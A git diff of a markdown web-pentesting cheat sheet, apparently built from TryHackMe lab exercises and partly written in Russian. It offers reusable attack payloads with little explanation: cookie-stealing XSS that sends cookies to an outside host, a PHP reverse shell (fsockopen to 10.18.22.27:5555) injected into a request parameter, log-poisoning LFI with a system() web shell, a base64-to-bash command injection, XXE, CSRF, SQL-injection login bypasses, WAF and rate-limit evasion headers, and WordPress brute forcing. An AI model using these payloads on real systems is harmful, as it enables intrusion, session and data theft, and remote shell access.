@@ -9,7 +9,7 @@ ffuf -replay-proxy http://127.0.0.1:8080 #ffuf with proxy
 
 wfuzz -c -z file,numbers.txt -d "number=FUZZ" --hw 81 http://sustah.thm:8085/
 ```
-
+---
 #### Discover subdomains:
 ```
 wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
@@ -22,14 +22,17 @@ ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-to
 
 amass enum -brute -passive -d nahamstore.com | anew subdomains.txt
 ```
+---
 #### Discover files with `wfuzz` :
 ```
 wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=FUZZ --hw=0
 ```
+---
 #### Brute force wordpress
 ```
 wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
 ```
+---
 #### Example of XXE 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -49,6 +52,7 @@ wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php">
 ]>
 ```
+---
 #### php local file inclusion
 ```
 http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
@@ -57,17 +61,20 @@ curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
 ```
+---
 #### bypass waf sqlmap
 ```
 --tamper=space2comment
 ```
 
+---
 #### cadaver for WebDAV
-
+---
 #### payload in json format
 ```
 "\";echo <base64 payload> | base64 -d | bash;\""
 ```
+---
 #### sqlmap
 ```bash
 sqlmap -r req.txt -p <parametr> --dbs
@@ -76,12 +83,14 @@ sqlmap -r req.txt -D <database_name> -T <table_name> --columns
 sqlmap -r req.txt-p  -D <database_name> --dump-all
 ```
 
+---
 #### steal cookie
 ```
 <script>window.location='http://<ip>:port/?cookie=' + document.cookie</script>
 
 <script>document.write('<img src="https://site.com?cookie='+document.cookie+'"width=0 height=0 border=0 />');</script>
 ```
+---
 #### CSRF
 ```
 <iframe style="display:none" name="csrf-frame"></iframe>
@@ -92,6 +101,7 @@ sqlmap -r req.txt-p  -D <database_name> --dump-all
     </form>
 <script>document.getElementById("csrf-form").submit()</script>
 ```
+---
 #### lfi bypass
 ```
 file/etc/passwd?/
@@ -102,6 +112,58 @@ file/etc/?/../passwd
 file/etc/%3F/../passwd?
 ```
 
+---
+#### bypass
+```
+добавляешь пользователя, формат json, то добавить “role”:"admin"
+────────────────────────────────────────────
+можно байпаснуть /admin если не пускают: /adMin или /adMin/users
+────────────────────────────────────────────
+можно удалять эвенты в html, которые выполняют фильтровку 
+────────────────────────────────────────────
+w'h'o'a'm'i
+────────────────────────────────────────────
+what=order&id=5$(php -r '$sock=fsockopen("10.18.22.27",5555);exec("sh <&3 >&3 2>&3");')
+────────────────────────────────────────────
+....//....//....//....//....//....//etc/passwd%00.jpg 
+....//....//....//..../
+────────────────────────────────────────────
+%20 - вместо пробела
+%0A - с новой строки
+file.php%00.jpg #null byte/....//....//etc/passwd%00
+────────────────────────────────────────────
+можно перезарегаться за пользователя, добавив просто пробел перед его username
+────────────────────────────────────────────
+bypass limit
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwared-Host: 127.0.0.1
+────────────────────────────────────────────
+login with '*'
+search with '.*'
+────────────────────────────────────────────
+поменять post на get и на оборот
+────────────────────────────────────────────
+поменять string на int и на оборот
+────────────────────────────────────────────
+username: ad'||'min
+password: a' IS NOT 'b
+────────────────────────────────────────────
+` ` {}
+────────────────────────────────────────────
+register admin user with admin%00
+────────────────────────────────────────────
+index.php~ - сохнарить sourse code
+────────────────────────────────────────────
+────────────────────────────────────────────
+────────────────────────────────────────────
+────────────────────────────────────────────
+```
+---
 #### links
 - [xss](https://requestcatcher.com/)| [tools](https://webhook.site)| [request](https://fjksdfds.requestcatcher.com/)| [inspector](https://requestinspector.com/)
 - [steal admin cookie/sqli](./src/src_for_src/marketplace.md) (tryhackme:marketplace)
